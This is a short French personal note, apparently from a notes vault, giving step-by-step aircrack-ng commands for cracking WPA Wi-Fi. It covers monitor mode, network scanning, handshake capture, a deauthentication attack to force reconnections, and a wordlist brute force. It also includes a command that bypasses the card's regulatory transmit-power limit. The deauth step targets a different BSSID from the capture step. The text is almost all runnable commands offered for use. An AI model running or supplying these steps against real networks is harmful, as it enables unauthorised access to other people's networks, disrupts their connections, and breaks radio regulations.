---
id: wifi_crack
created_date: 16/02/2023
updated_date: 16/02/2023
type: note
---

#  wifi_crack
- **🏷️Tags** :  #02-2023 #wifi #crack #tools 

## 📝 Notes

### Mettre sa carte en mode monitor


```bash
sudo ifconfig wlan1 down
sudo iwconfig wlan1 mode monitor
sudo ifconfig wlan1 up
```

pour tester si sa carte est compatible utiliser la commande :


```bash
sudo aireplay-ng --test wlan1
```

### Faire un scan du réseaux 

- dans un premier temps taper la commande 

```bash
sudo airodump-ng wlan1
```

- récupérer le nom de l'interface réseaux qui vous intéresse
- ainsi que son BSSID et que son numéro de channel ( bien vérifier son type d' ENC ).
### lancer l'attaque
on souhaite ici récupérer le handshake et pour cela on va avoir besoin du BSSID et du channel.

```bash

sudo airodump-ng -c 6 --bssid 44:D4:54:ED:F9:60 --output-format pcap -w ~/Bureau wlan1

```

pour accélérer les choses on va lancer en même temps une attaque de Dauth contre la machine. ( sinon c'est gavé long ).

```bash
sudo aireplay-ng -0 20 -a E4:9E:12:89:FE:D4  wlan1
```

une fois que le handshake est obtenue et qu'une certaine quantité de requête aussi passer à l'étape suivante.

### crack et brutforce


```bash
aircrack-ng -a2 -b <BSSID> -w /chemi/du/dico.txt ./chemi/du/fichier/cap/enregistrer.cap

```

debrider carte alfa 


```bash
sudo ifconfig wlan1 down  
sudo iw reg set BZ  
sudo iwconfig wlan1 txpower 30  
sudo ifconfig wlan1 up  
iwconfig

```


## Questions/Thoughts


## 🔗 Links
- 